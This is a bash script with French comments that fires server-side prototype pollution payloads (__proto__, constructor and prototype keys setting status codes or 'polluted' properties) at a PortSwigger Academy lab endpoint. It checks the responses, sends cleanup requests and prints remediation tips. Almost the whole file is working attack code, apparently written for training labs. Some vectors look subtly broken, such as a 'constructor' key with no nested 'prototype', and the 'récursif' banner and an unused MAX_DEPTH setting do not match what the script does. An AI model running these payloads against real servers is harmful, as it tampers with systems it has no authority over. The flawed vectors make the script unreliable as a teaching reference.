#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
ENDPOINT="/api/submit"
POLLUTE_VAL="510"
CLEAN_VAL="0"
MAX_DEPTH=2
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

gen_payload() {
    # $1: vecteur (__proto__), $2: propriété (status), $3: valeur (510)
    echo "{\"$1\":{\"$2\":$3}}"
}

# Challenge 1: Server-side prototype pollution via __proto__
challenge_proto_pollution_proto() {
    print_sep
    echo "[Challenge 1] Server-side prototype pollution via __proto__ (PortSwigger: 'Server-side prototype pollution via __proto__')"
    found=0
    for prop in "status" "statusCode"; do
        payload=$(gen_payload "__proto__" "$prop" "$POLLUTE_VAL")
        echo "  [Test] Payload: $payload"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$TARGET_URL$ENDPOINT")
        code=$(echo "$resp" | grep -Eo "\"statusCode\"[ ]*:[ ]*$POLLUTE_VAL")
        http=$(curl -sk -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{}' "$TARGET_URL$ENDPOINT")
        if [[ "$code" != "" ]] || [[ "$http" == "$POLLUTE_VAL" ]]; then
            echo "  [+] Pollution détectée via __proto__.$prop"
            found=1
            clean_payload=$(gen_payload "__proto__" "$prop" "$CLEAN_VAL")
            curl -sk -X POST -H "Content-Type: application/json" -d "$clean_payload" "$TARGET_URL$ENDPOINT" > /dev/null
            break
        fi
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun effet détecté via __proto__."
}

# Challenge 2: Server-side prototype pollution via constructor
challenge_proto_pollution_constructor() {
    print_sep
    echo "[Challenge 2] Server-side prototype pollution via constructor (PortSwigger: 'Server-side prototype pollution via constructor')"
    found=0
    for prop in "status" "statusCode"; do
        payload=$(gen_payload "constructor" "$prop" "$POLLUTE_VAL")
        echo "  [Test] Payload: $payload"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$TARGET_URL$ENDPOINT")
        code=$(echo "$resp" | grep -Eo "\"statusCode\"[ ]*:[ ]*$POLLUTE_VAL")
        http=$(curl -sk -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{}' "$TARGET_URL$ENDPOINT")
        if [[ "$code" != "" ]] || [[ "$http" == "$POLLUTE_VAL" ]]; then
            echo "  [+] Pollution détectée via constructor.$prop"
            found=1
            clean_payload=$(gen_payload "constructor" "$prop" "$CLEAN_VAL")
            curl -sk -X POST -H "Content-Type: application/json" -d "$clean_payload" "$TARGET_URL$ENDPOINT" > /dev/null
            break
        fi
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun effet détecté via constructor."
}

# Challenge 3: Server-side prototype pollution via prototype
challenge_proto_pollution_prototype() {
    print_sep
    echo "[Challenge 3] Server-side prototype pollution via prototype (PortSwigger: 'Server-side prototype pollution via prototype')"
    found=0
    for prop in "status" "statusCode"; do
        payload=$(gen_payload "prototype" "$prop" "$POLLUTE_VAL")
        echo "  [Test] Payload: $payload"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$TARGET_URL$ENDPOINT")
        code=$(echo "$resp" | grep -Eo "\"statusCode\"[ ]*:[ ]*$POLLUTE_VAL")
        http=$(curl -sk -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{}' "$TARGET_URL$ENDPOINT")
        if [[ "$code" != "" ]] || [[ "$http" == "$POLLUTE_VAL" ]]; then
            echo "  [+] Pollution détectée via prototype.$prop"
            found=1
            clean_payload=$(gen_payload "prototype" "$prop" "$CLEAN_VAL")
            curl -sk -X POST -H "Content-Type: application/json" -d "$clean_payload" "$TARGET_URL$ENDPOINT" > /dev/null
            break
        fi
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun effet détecté via prototype."
}

# Challenge 4: Server-side prototype pollution - gadget property
challenge_proto_pollution_gadget() {
    print_sep
    echo "[Challenge 4] Server-side prototype pollution via gadget property (PortSwigger: 'Server-side prototype pollution using gadget property')"
    found=0
    for prop in "polluted" "pollutedKey"; do
        payload=$(gen_payload "__proto__" "$prop" "\"polluted\"")
        echo "  [Test] Payload: $payload"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$TARGET_URL$ENDPOINT")
        if echo "$resp" | grep -q "polluted"; then
            echo "  [+] Pollution détectée via gadget property $prop"
            found=1
            clean_payload=$(gen_payload "__proto__" "$prop" "\"cleaned\"")
            curl -sk -X POST -H "Content-Type: application/json" -d "$clean_payload" "$TARGET_URL$ENDPOINT" > /dev/null
            break
        fi
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun effet détecté via gadget property."
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Filtrez les clés __proto__, prototype, constructor dans tous les merges/extends d'objets."
    echo "- Utilisez Object.create(null) pour éviter l'héritage du prototype global."
    echo "- Appliquez les recommandations PortSwigger : https://portswigger.net/web-security/prototype-pollution/server-side"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "Challenges testés :"
    echo "1. Server-side prototype pollution via __proto__"
    echo "2. Server-side prototype pollution via constructor"
    echo "3. Server-side prototype pollution via prototype"
    echo "4. Server-side prototype pollution using gadget property"
    echo "Tous les tests sont non destructifs, avec nettoyage automatique après test."
    print_sep
}

echo "=== Script PortSwigger Prototype Pollution (noms des challenges, récursif) ==="
challenge_proto_pollution_proto
challenge_proto_pollution_constructor
challenge_proto_pollution_prototype
challenge_proto_pollution_gadget
print_remediation
print_summary

# End of script
